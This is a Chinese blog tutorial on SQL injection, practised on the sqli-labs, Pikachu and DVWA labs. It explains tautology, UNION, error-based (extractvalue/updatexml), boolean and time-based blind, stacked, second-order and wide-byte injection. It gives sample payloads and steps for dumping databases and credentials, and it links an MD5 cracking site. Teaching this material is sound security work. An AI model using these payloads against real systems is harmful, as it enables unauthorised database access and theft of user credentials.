@@ -1,0 +1,428 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <title>SQL注入 二开desu | Sat0ru_G0j0 | むりょうくうきょ</title>
+
+  
+  <meta name="author" content="Satoru">
+  
+
+  
+  <meta name="description" content="不当了 不当高手！">
+  
+
+  
+  <meta name="keywords" content="Penetration Testing">
+  
+
+  <meta id="viewport" name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1, user-scalable=no, minimal-ui">
+  <meta name="apple-mobile-web-app-capable" content="yes">
+  <meta name="apple-mobile-web-app-status-bar-style" content="black">
+
+  <meta property="og:title" content="SQL注入 二开desu"/>
+
+  <meta property="og:site_name" content="Sat0ru_G0j0"/>
+
+  
+  <meta property="og:image" content="/favicon.ico"/>
+  
+
+  <link href="/favicon.ico" rel="icon">
+  <link rel="alternate" href="/atom.xml" title="Sat0ru_G0j0" type="application/atom+xml">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+<div class="blog">
+  <div class="content">
+
+    <header>
+  <div class="site-branding">
+    <h1 class="site-title">
+      <a href="/">Sat0ru_G0j0</a>
+    </h1>
+    <p class="site-description">むりょうくうきょ</p>
+  </div>
+  <nav class="site-navigation">
+    <ul>
+      
+        <li><a href="/">首页</a></li>
+      
+        <li><a href="/archives">文档</a></li>
+      
+        <li><a href="/categories">分类</a></li>
+      
+        <li><a href="/tags">标签</a></li>
+      
+    </ul>
+  </nav>
+</header>
+
+    <main class="site-main posts-loop">
+    <article>
+
+  
+    
+    <h3 class="article-title"><span>SQL注入 二开desu</span></h3>
+    
+  
+
+  <div class="article-top-meta">
+    <span class="posted-on">
+      <a href="/2024/07/08/SQL注入/" rel="bookmark">
+        <time class="entry-date published" datetime="2024-07-08T02:55:30.535Z">
+          2024-07-08
+        </time>
+      </a>
+    </span>
+  </div>
+
+
+  
+
+  <div class="article-content">
+    <div class="entry">
+      
+        <h1 id="SQL注入二开"><a href="#SQL注入二开" class="headerlink" title="SQL注入二开"></a>SQL注入二开</h1><p>本教程基于SQL i-Labs,pikachu,dvwa等靶场做拓展</p>
+<h1 id="基本原理和概念简介"><a href="#基本原理和概念简介" class="headerlink" title="基本原理和概念简介"></a>基本原理和概念简介</h1><p>SQL注入是黑客攻击最常见的方法，SQL注入作为OWASP中四大Web应用程序十大安全漏洞之一，也可以被一些没有太多网络安全技术“脚本小子”利用，因此掌握SQL注入原理和预防机制非常重要</p>
+<h1 id="HOW-to-build-SQLI-Lab"><a href="#HOW-to-build-SQLI-Lab" class="headerlink" title="HOW to build SQLI-Lab"></a>HOW to build SQLI-Lab</h1><h3 id="简单的部署"><a href="#简单的部署" class="headerlink" title="简单的部署"></a>简单的部署</h3><p>图方便的话 直接通过Docker部署就可以了</p>
+<p>也可以部署在Web应用系统平台，</p>
+<h3 id="从０开始部署"><a href="#从０开始部署" class="headerlink" title="从０开始部署"></a>从０开始部署</h3><p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240708172147084.png" alt="image-20240708172147084"></p>
+<h3 id="Web应用程序系统"><a href="#Web应用程序系统" class="headerlink" title="Web应用程序系统"></a>Web应用程序系统</h3><p>Web应用程序系统的总体体系结构如图一所示</p>
+<p>客户端是浏览器，服务端通常包括了Web服务器，数据库服务器和高级语言解释器，典型的Web服务器架构包括</p>
+<p>Apache+PHP+MySQL</p>
+<p>IIS＋ASP+MYSQL等</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240708171810391.png" alt="image-20240708171810391"></p>
+<h1 id="HOW-does-it-form-–SQL-INJECTION"><a href="#HOW-does-it-form-–SQL-INJECTION" class="headerlink" title="HOW does it form –SQL INJECTION"></a>HOW does it form –SQL INJECTION</h1><p>SQL注入本质是攻击者在Web表单或者URL中插入SQL命令或者片段到查询字符串中,当Web服务器没有严格验证输入和传递字符串的有效性时,攻击者就可以达到<strong>欺骗数据库服务器</strong>,执行恶意SQL命令的效果</p>
+<p>在此之前还要了解一个概念**’隐式转换’**</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240708173609585.png" alt="image-20240708173609585"></p>
+<h1 id="SQL-INJECTION-LIST"><a href="#SQL-INJECTION-LIST" class="headerlink" title="SQL INJECTION LIST"></a>SQL INJECTION LIST</h1><p>包括了</p>
+<p>同义SQL注入,联合注入,基于报错的注入,盲注.</p>
+<h4 id="Tautologic-SQL注入-真理SQL"><a href="#Tautologic-SQL注入-真理SQL" class="headerlink" title="Tautologic SQL注入(真理SQL)"></a>Tautologic SQL注入(真理SQL)</h4><p>这是一种简单的攻击方法,在系统原SQL命令中插入了一个tautologic(常为正确的)条件子句,使原SQL语句的条件限定不起作用.</p>
+<h4 id="联合SQL注入"><a href="#联合SQL注入" class="headerlink" title="联合SQL注入"></a>联合SQL注入</h4><p>本质上利用了SQL命令中的联合查询,从而可以执行插入的查询,从特定的数据表中窃取信息</p>
+<p>建议在此之前 先学会基本的SQL注入的增删改查,并清除SQL库表的结构如何</p>
+<h4 id="基于报错的SQL注入"><a href="#基于报错的SQL注入" class="headerlink" title="基于报错的SQL注入"></a>基于报错的SQL注入</h4><p>攻击者将格式错误的SQL命令作为攻击负载使系统返回一些报错,从而使系统返回一些过度暗示的信息</p>
+<p>比如说Order by 1—–n(列溢出报错)</p>
+<h4 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h4><p>对于盲注攻击,攻击者会构造一些SQL查询条件,系统对这些查询条件的不同状态会有不同响应,进而获得系统的内部信息</p>
+<h1 id="SQL-injection-Begin"><a href="#SQL-injection-Begin" class="headerlink" title="SQL injection Begin"></a>SQL injection Begin</h1><h2 id="数字型—最基本的检验"><a href="#数字型—最基本的检验" class="headerlink" title="数字型—最基本的检验"></a>数字型—最基本的检验</h2><p>数字型可以检验程序本身是否有对用户的输入做任何的额外处理</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">------------------------测试步骤-----------------------</span><br><span class="line">1.加单引号</span><br><span class="line">URL:www.text.com/text.php?id=1&#x27;]</span><br><span class="line">对应数据服务器响应的SQL命令：</span><br><span class="line">select * from table where id =1&#x27;</span><br><span class="line">这时SQL语句出错，程序无法从数据库中查询出数据，此时可以判断出大概率存在注入，因为只有服务器将对应的单引号一起当作SQL语句执行了才会出现报错，但这也并不绝对，也有可能是程序本身的问题</span><br><span class="line">2.加 and 1=1</span><br><span class="line">URL：www.text.com/text.php?id=1 and 1=1</span><br><span class="line">对应数据服务器响应的SQL命令：</span><br><span class="line">select * from table where id =1 and 1=1</span><br><span class="line">这时语句执行一定是正常的，因为加入了tautologic式的条件子句</span><br><span class="line">3.加 and 1=2</span><br><span class="line">URL：www.text.com/text.php?id=1 and 1=2</span><br><span class="line">对应数据服务器响应的SQL命令</span><br><span class="line">select * from table where id =1 and 1=2</span><br><span class="line">这时语句可以正常执行但无法查询出任何结构，返回数据与原始网页会存在一定的差异</span><br></pre></td></tr></table></figure>
+
+<p>如果这三个payload传入过后同上述代码块中提出的响应是一致的，那么程序本身就是并没有对用户的输入做任何额外处理的，则可以判断该URL存在数字型注入</p>
+<h2 id="字符型"><a href="#字符型" class="headerlink" title="字符型"></a>字符型</h2><p>当传入的参数类型为字符串时，若存在漏洞则称为字符型漏洞，字符型和数字型最大的一个区别在于数字型不需要单引号来闭合而字符串一般需要单引号来闭合对应传入的参数</p>
+<p>字符型语句如下:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from table where id = ‘admin’</span><br></pre></td></tr></table></figure>
+
+<p>因此在构造payload时通过闭合单引号可以成功执行语句</p>
+<p>比方</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240708200640557.png" alt="image-20240708200640557"></p>
+<p>–为什么要这么做</p>
+<p>首先服务端要求我们传入的参数是字符型 在传入的过程中需要将我们自己的恶意指令注入就需要首先满足隐式转换的条件–即先让它接收到需要的字符型变量，然后再通过一些条件子句代入我们自己的语句</p>
+<p>也就是说 我们可以这么做</p>
+<p>原本的查询语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from table where name =&#x27;（用户输入点）&#x27;+后续语句</span><br></pre></td></tr></table></figure>
+
+<p>这个时候我们在输入点输入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; or 1=1 #</span><br></pre></td></tr></table></figure>
+
+<p>那么可以如此合成</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from table where name =&#x27; 1&#x27; or 1=1 #&#x27;+后续语句</span><br></pre></td></tr></table></figure>
+
+<p>可以发现不但闭合了前面的语句，同时通过条件语句插入了攻击者的语句，并注释（使无效化）后面可能会出现的另外一些条件语句。</p>
+<p>可以用一句话很优雅的总结数字型和字符型</p>
+<p>​                              <strong>—猎人往往以猎物的方式出现—</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240708201225404.png" alt="image-20240708201225404"></p>
+<h2 id="Union注入"><a href="#Union注入" class="headerlink" title="Union注入"></a>Union注入</h2><p>联合查询可以一句SQL语句中执行多个查询任务，把查询任务从一个表追加到另外一个表，使用UNION或者UNION　ALL来实现</p>
+<p>UNION ALL和UNION的区别是UNION ALL操作符可以查询重复的值</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240708202413083.png" alt="image-20240708202413083"></p>
+<p>使用UNION注入也是有前提条件的,Union all左右两边查询的列数必须一致</p>
+<p>以上图为例</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> user_id,first_name <span class="keyword">from</span> users <span class="keyword">where</span> user_id<span class="operator">=</span><span class="number">1</span> <span class="keyword">union</span> <span class="keyword">all</span> <span class="keyword">select</span> user_id,first_name,last_name <span class="keyword">from</span> users <span class="keyword">where</span> user_id<span class="operator">=</span><span class="number">1</span></span><br></pre></td></tr></table></figure>
+
+<p>这个时候你可以发现,union all操作符前的sql语句查询了users表中user_id&#x3D;1所对应的user_id列和first_name.而在union操作符后的sql语句则不同,其对应多查询了一个last_name参数，这个时候查询语句不成立。</p>
+<h3 id="怎么确定字段数"><a href="#怎么确定字段数" class="headerlink" title="怎么确定字段数"></a>怎么确定字段数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># by2时回显正常</span><br><span class="line">order by 2#</span><br><span class="line"># by3时回显异常</span><br><span class="line">order by 3#</span><br></pre></td></tr></table></figure>
+
+<p>思考：<br>1.为什么用order by 可以证明前面语句查询了三列数据呢？<br>2.我们为什么要知道前面查询了多少语句呢？<br>解：<br>第一题：<br>首先我们要知道order by的作用：order by 简单的来说 就是对前面查询的数据进行分组，分组依据是前面查询的内容的属性。比如说前面查询的数据是甲、乙、丙，我们可以根据这三种属性的一到三种进行分类，但是不能超过三种。所以上面order by 4 会报错误信息。因此可以依据此来判断前面查询了几列数据。<br>第二题：<br>因为使用union函数进行查询时，union前面查询语句查询的元素与后面查询语句查询的元素要数量上一样，所以我们必需要知道前面语句查询了多少个元素。比如，此语句：select 甲,乙,丙 union select 1,2,3 因为前面查询的语句有三个元素（甲，乙，丙），所以后面查询的语句必须是三个元素（1，2，3）。</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709100240768.png" alt="image-20240709100240768"></p>
+<p>类似上图所说的 我们就可以通过联合查询得到一些关键性的信息</p>
+<p>这里我们也可以介绍一个比较重要的知识点，在MYSQL５.０以上版本，存在一个自带的数据库:information_schema(重点)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709101446333.png" alt="image-20240709101446333"></p>
+<p>information_schema数据库中还要三个表非常重要：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SCHEMATA:　表里包含所有数据库的名字</span><br><span class="line">TABLES：　　表里包含所有数据库的所有表</span><br><span class="line">COLUMNS：　　表里包含所有数据库的所有表的所有字段</span><br></pre></td></tr></table></figure>
+
+<p>联合注入的过程:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">１.判断是否存在注入，注入是字符型还是整数型</span><br><span class="line">２.猜解SQL查询语句中的字段数（ｏｒｄｅｒ　ｂｙ）</span><br><span class="line">３.确定显示位</span><br><span class="line">４.获取当前数据库（爆库</span><br><span class="line">５.获取数据库中的表（爆表</span><br><span class="line">６.获取表中的字段名（爆字段</span><br><span class="line">７.下载数据（爆数据</span><br><span class="line">这里以Pikachu联系平台为例</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709110242890.png" alt="image-20240709110242890"></p>
+<p>这里截取一个基本的流程 以DVWA靶场为例</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709110813626.png" alt="image-20240709110813626"></p>
+<p>一般爆出的密码是经过一层加密的,这个时候可以利用在线工具对应解码爆出真实的密码</p>
+<p>这里附上在线工具</p>
+<p><a target="_blank" rel="noopener" href="https://cmd5.com/">md5在线解密破解,md5解密加密 (cmd5.com)</a></p>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>报错注入顾名思义主要是利用数据库报错来进行判断是否存在注入点，如果不符合数据库语法规则就会 报错并返回错误信息。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">常用的特殊字符：&#x27; \ ; %00 ) ( # &quot;</span><br></pre></td></tr></table></figure>
+
+<p>在MySQL高版本中添加了对XML文档进行查询和修改的函数,这两个函数常用于报错注入</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">extractvalue()</span><br><span class="line">updatexml()</span><br></pre></td></tr></table></figure>
+
+<p>原因:当这两个函数在执行时,如果出现XML文档路径错误就会产生报错.</p>
+<h3 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h3><ul>
+<li>此函数从目标XML中返回包含所查询值的字符串,语法:extractvalue(XML_document,xpath_string)</li>
+</ul>
+<p>第一个参数:</p>
+<p>string格式,即XNL文档对象名称</p>
+<p>第二个参数:Xpath_string(Xpath形式的字符串,为XML文档的路径)</p>
+<p>extractvalue使用时若Xpath_string格式出错,mysql数据库服务器是会爆出错误的,<strong>对应的报错也会很明显的给我们指出错误类型为xpath语法错误</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709151441863.png" alt="image-20240709151441863"></p>
+<p>extractvalue原本是用于从documentr返回包含string的字符串,那么string参数不符合xpath的语法就会爆出错误,将查询结果同步放在信息里.<strong>这本质上也是利用了该函数报错的危险特性,将我们想要查询的结果以非xpath语法格式强行放入该函数,”勒令”它帮我们查询需要的信息</strong></p>
+<h4 id="这里突然插入-SQL注入的基本思路"><a href="#这里突然插入-SQL注入的基本思路" class="headerlink" title="-这里突然插入  SQL注入的基本思路-"></a>-这里突然插入  SQL注入的基本思路-</h4><p>SQL注入本质上其实也都明白了,就是利用现成的服务端给我们预留的查询语句进而实现从无关紧要的信息越位到更为重要更为核心的信息</p>
+<p><strong>那么首先我们要搞懂的就是该如何利用这条服务端留给我们的现成的语句了</strong></p>
+<p>其实道理很简单:</p>
+<p>一,先搞清楚服务端目前供给我们来查询的是什么</p>
+<p>那么这个时候就是可以通过思考SQL典型的树状结构,一步一步爆出我们想要的东西</p>
+<p>SQL经典结构:   库(schema)–&gt;表(tables)—&gt;字段(column)</p>
+<p>从这些最基本的出发,我们可以逐步摸清并加以利用,实现从边缘信息到重要信息的爬取</p>
+<h4 id="注入思路实践简述"><a href="#注入思路实践简述" class="headerlink" title="注入思路实践简述"></a>注入思路实践简述</h4><p><strong>爆库名</strong>–&gt;<strong>爆表数</strong>–&gt;<strong>爆表名</strong>–&gt;<strong>爆列名</strong>–&gt;<strong>获得用户名和密码</strong></p>
+<p>那么这里开始利用extractvalue()做一些经典的操作(doge)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709192227234.png" alt="image-20240709192227234"></p>
+<h3 id="updatexml-函数"><a href="#updatexml-函数" class="headerlink" title="updatexml()函数"></a>updatexml()函数</h3><p>updatexml()是一个使用不同的XML标记匹配和替换XML块的函数</p>
+<p>作用:该百年文档中符合条件的节点的值</p>
+<p>语法:</p>
+<p>update(XML_document, xpath_string, new_value)</p>
+<p>第一个参数;string格式,为XML文档对象的名称</p>
+<p>第二个参数:代表路径,xpath形式的字符串例如&#x2F;title</p>
+<p>第三个参数:string格式,替换查找到的符合条件的数据</p>
+<p>updatexml使用同extractvalue()函数,都是当出现错误时爆出错误信息,并弹出对应的暗示信息,这个就没什么好说的了,直接截图套路即可,自行copy即可(doge)</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709192932960.png" alt="image-20240709192932960"></p>
+<p>其实本质很简单,只是单纯的用两个0x7e占位罢了</p>
+<h2 id="盲注-1"><a href="#盲注-1" class="headerlink" title="盲注"></a>盲注</h2><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>盲注顾名思义,就是一抹黑,无回显无报错的查询.</p>
+<h4 id="1-只能判断是否存在注入和注入的类型"><a href="#1-只能判断是否存在注入和注入的类型" class="headerlink" title="1.只能判断是否存在注入和注入的类型"></a>1.只能判断是否存在注入和注入的类型</h4><p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709193722352.png" alt="image-20240709193722352"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709193749808.png" alt="image-20240709193749808"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709193815739.png" alt="image-20240709193815739"></p>
+<p>由图可知,对应的盲注就是像上面这样只有两种反馈信息,要么就是查询到了,要么就是查询不到,那么我们该怎么判断是否成功注入了呢?那么就要推翻我们只能从查询信息和报错信息中汲取攻击面的固有思维,从别的方面深入,一击毙命.</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709194633365.png" alt="image-20240709194633365"></p>
+<p>这里以pikachu靶场中的盲注题型为例,假设一开始我们已知用户vince,想爆出他们的密码</p>
+<table>
+<thead>
+<tr>
+<th align="center">序号</th>
+<th align="center">构造ID取值</th>
+<th align="center">反馈</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">1</td>
+<td align="center">vince</td>
+<td align="center">存在信息回显</td>
+</tr>
+<tr>
+<td align="center">2</td>
+<td align="center">‘</td>
+<td align="center">不存在信息回显</td>
+</tr>
+<tr>
+<td align="center">3</td>
+<td align="center">vince’ and 1&#x3D;1#</td>
+<td align="center">存在信息回显</td>
+</tr>
+<tr>
+<td align="center">4</td>
+<td align="center">vince’ and 1&#x3D;2#</td>
+<td align="center">不存在信息回显</td>
+</tr>
+</tbody></table>
+<p>由条件3和4的构造真假返回对应不同的结果,可知存在SQL注入漏洞</p>
+<p>不过只能知道存在是不够的,要加以利用才是硬道理</p>
+<h4 id="2-猜解当前数据库名称"><a href="#2-猜解当前数据库名称" class="headerlink" title="2.猜解当前数据库名称"></a>2.猜解当前数据库名称</h4><h5 id="1-猜解数据库名称长度-二分法"><a href="#1-猜解数据库名称长度-二分法" class="headerlink" title="1)猜解数据库名称长度(二分法)"></a>1)猜解数据库名称长度(二分法)</h5><p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709195523654.png" alt="image-20240709195523654"></p>
+<h5 id="2）判断数据库名称的字符组成元素"><a href="#2）判断数据库名称的字符组成元素" class="headerlink" title="2）判断数据库名称的字符组成元素"></a>2）判断数据库名称的字符组成元素</h5><p>在给定的字符串中利用substr()函数，从指定位置开始截取指定长度的字符串，分离出数据库名称的每个 位置的元素，并分别将其转换为ASCII码，与对应的ASCII码值比较大小，找到比值相同时的字符，然后 逐个击破。</p>
+<p><a target="_blank" rel="noopener" href="https://www.sojson.com/asciitable.html">ASCII码对照表|ASCII编码 (sojson.com)</a></p>
+<h5 id="substr的用法"><a href="#substr的用法" class="headerlink" title="substr的用法"></a>substr的用法</h5><p>substr在这里主要用作将字符串中单单一个字符截取出来,后续我们使用ascil函数与二分法逐步迭代出我们需要的数字</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709200603601.png" alt="image-20240709200603601"></p>
+<h5 id="猜解数据库中的表名"><a href="#猜解数据库中的表名" class="headerlink" title="猜解数据库中的表名"></a>猜解数据库中的表名</h5><p><strong>猜解表的个数</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709200545105.png" alt="image-20240709200545105"></p>
+<p><strong>猜解表名–从长度到具体的字符组成</strong></p>
+<p>这里是猜解长度</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709200844644.png" alt="image-20240709200844644"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709201142364.png" alt="image-20240709201142364"></p>
+<p>剩下的字段名字段值不过多赘述,流程是一致的</p>
+<p>最后如果密码有经过某些解密方法那么为只需要重新带回就好了.最后验证一下字段的有效性就可以了</p>
+<p>最后在这里想说的是 手工爆破的工作量是很大的,可以尝试学习python自动化脚本精简掉大部分的内容</p>
+<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>倘若界面返回值只有一种True,无论输入任何值,返回情况都会按正常来处理,加入特定的时间函数,通过查看WEB页面返回的时间差来判断注入的语句是否正确.</p>
+<h4 id="猜解数据库的名称"><a href="#猜解数据库的名称" class="headerlink" title="猜解数据库的名称"></a>猜解数据库的名称</h4><p>其实本质上和布尔盲注的区别就在于, 它将返回信息转化成了响应时间上的区别,若判断条件为真,则执行sleep(n)函数,达到正常响应时间短基础上再延迟相应时间n瞄的效果;若判断条件为假则返回设置的1,此时不执行sleep(n)函数</p>
+<p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and if(length(database())=4,sleep(5),1);#</span><br><span class="line">1&#x27; and if(ascii(substr(database(),1,1))=100,sleep(5),1);#</span><br></pre></td></tr></table></figure>
+
+<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>盲注需要这样集中函数</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">length（） 返回字符串的长度</span><br><span class="line">substr（） 截取字符串</span><br><span class="line">ascil（） 返回字符对应的ASCII码</span><br><span class="line">sleep（） 将程序挂起一段时间</span><br></pre></td></tr></table></figure>
+
+<h2 id="堆叠查询注入"><a href="#堆叠查询注入" class="headerlink" title="堆叠查询注入"></a>堆叠查询注入</h2><p>堆叠注入，从名词的含义就可以看到应该是<strong>一堆 sql 语句（多条）一起执行，而在真实的运用中也是这样的</strong>。我们知道在Mysql中，主要是命令行中，每一条语句结尾加 ; 表示语句结束，<strong>这样我们就想到了是 不是可以多句一起使用。</strong>其原理也很简单，就是将原来的语句构造完后加上分号，代表该语句结束，后 面再输入的就是一个全新的SQL语句，这个时候使用增删改查毫无限制</p>
+<p>堆叠注入的使用条件是十分有限的,极有可能收到API或者数据库引擎,又或者权限的限制,只有当调用数据库函数支持执行多条SQL语句时才能使用,</p>
+<p>利用mysqli_multi_query()函数就支持多条SQL语句同时执行，但实际情况中，如PHP为了防止所谓的SQL注入机制，调用数据库的函数往往都只是mysqli_query()函数,只能执行一条语句,所以说堆叠注入的使用条件是十分有限的且实战中很少会有这种啥防护器也不上的网页()</p>
+<p>因此SQL注入分类总结可以如下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1.根据查询字段：数字型，字符型</span><br><span class="line">2.根据查询方式：Union注入、堆叠注入</span><br><span class="line">3.根据回显：报错、盲注</span><br></pre></td></tr></table></figure>
+
+<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>二次注入是指存入存出的过程中,存入数据库的时候做了过滤但是去取出来的时候没有坐果率,而产生的数据库注入.</p>
+<h3 id="插入恶意数据"><a href="#插入恶意数据" class="headerlink" title="插入恶意数据"></a>插入恶意数据</h3><p>在第一次想数据库插入数据时,使用addslashes对其中的特殊字符进行转义,但是addslashes函数有一个特点;虽然参数过滤后添加\进行转义,但是\并不会插入到数据库中,写入时还是保留了原来的数据.</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">在MySQL中，反斜线在字符串中属于是转义字符，经过语法解析器解析时会进行一次转义，所以当我们插入反斜线也就是通过insert“\”时，如insert “\”在数据库中只会存储“”，第一个反斜线（\)被当作转义字符处理</span><br></pre></td></tr></table></figure>
+
+<h3 id="引用恶意数据"><a href="#引用恶意数据" class="headerlink" title="引用恶意数据"></a>引用恶意数据</h3><p>在将数据存入到数据库中之后,开发者就认为数据可信了.在下一次进行需要进行查询的时候,直接从数据库中取出了脏数据,没有进行进一步的检验和处理,这样就会造成SQL的二次注入</p>
+<p><strong>比如第一次插入数据的时候,数据中带有单引号,直接插入到了数据库中–然后下一次使用在拼凑的过程中就形成了二次注入.</strong></p>
+<p>二次注入漏洞原理示意图</p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709214142033.png" alt="image-20240709214142033"></p>
+<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><h3 id="宽字节概念"><a href="#宽字节概念" class="headerlink" title="宽字节概念"></a>宽字节概念</h3><p>1、如果一个字符的大小是一个字节的，称为窄字节；</p>
+<p> 2、如果一个字符的大小是两个及以上字节的，称为宽字节； 像GB2312、GBK、GB18030、BIG5、Shift_JIS等编码都是常见的宽字节字符集。 英文默认占一个字节，中文占两个字节。</p>
+<h3 id="宽字节注入原理"><a href="#宽字节注入原理" class="headerlink" title="宽字节注入原理"></a>宽字节注入原理</h3><p>宽字节注入利用给MYSQL的一个特性,利用GBK编码的时候,会认为两个字符是一个汉字,为了防止网站被SQL注入,网站开发人员自然也会做一些防护,最基础的就是对一些特殊字符进行转义</p>
+<p><strong>统筹前面学习的内容,可以发现SQL注入最关键的一步就是让引号闭合和跳出引号,如果无法跳出引号,那么输入的内容就永远在引号里,即永远是字符串,无法实现SQL注入</strong></p>
+<p>网站开发者也想到了这一步,于是他们痛定思痛开始进步,从最简单的一个措施开始做起:<strong>转义</strong>—<strong>对输入的敏感内容、特殊字符进行转换，比方将引号替换为null</strong></p>
+<h4 id="addslashes（）函数"><a href="#addslashes（）函数" class="headerlink" title="addslashes（）函数"></a>addslashes（）函数</h4><p>1、该函数会在预定义字符之前添加反斜线进行转义，<br>2、预定义字符一般有：单引号 双引号 反斜线 null</p>
+<p>所谓的转义就是将预定义字符加上反斜线，使其失去占位构造语句的作用，使预定义字符仅仅是一个普通的字符串</p>
+<p><strong>以pikachu数据库中的member表为例：</strong></p>
+<p><img src="https://cdn.jsdelivr.net/gh/xzb666-hub/myblogimage@img/image/image-20240709220531493.png" alt="image-20240709220531493"></p>
+<p>通过前面的SQL注入实验可以发现，字符型的注入点都是通过单引号闭合前后的反馈来判断的，但遇到addslashes（）函数时，单引号会被转义，导致我们用来判断注入点的单引号失效，所以我们的目的就是使转义符\失效，使单引号逃逸</p>
